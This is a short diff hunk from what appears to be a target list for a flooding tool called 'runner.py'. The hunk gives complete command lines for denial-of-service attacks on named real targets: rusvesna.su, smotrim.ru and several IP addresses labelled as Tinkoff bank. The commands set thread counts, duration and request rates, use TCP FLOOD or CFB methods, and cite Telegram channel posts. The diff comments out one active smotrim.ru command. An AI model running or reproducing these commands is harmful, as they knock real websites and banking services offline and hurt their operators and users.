@@ -2,7 +2,7 @@
 #runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 3600 --rpc 50 --http-methods CFB
 
 ### smotrim.ru https://t.me/c/1624648668/85
-runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
+#runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ### тинькофф https://t.me/c/1624648668/89
 #runner.py tcp://92.223.84.84:80 tcp://92.223.84.84:443 tcp://91.194.226.50:80 tcp://91.194.226.50:443 tcp://78.46.94.184:80 tcp://78.46.94.184:443 tcp://46.4.106.111:80 tcp://46.4.106.111:443 tcp://91.194.226.32:80 tcp://91.194.226.32:443 tcp://91.194.226.22:80 tcp://91.194.226.22:443 tcp://91.194.226.15:80 tcp://91.194.226.15:443 tcp://91.194.226.6:80 tcp://91.194.226.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
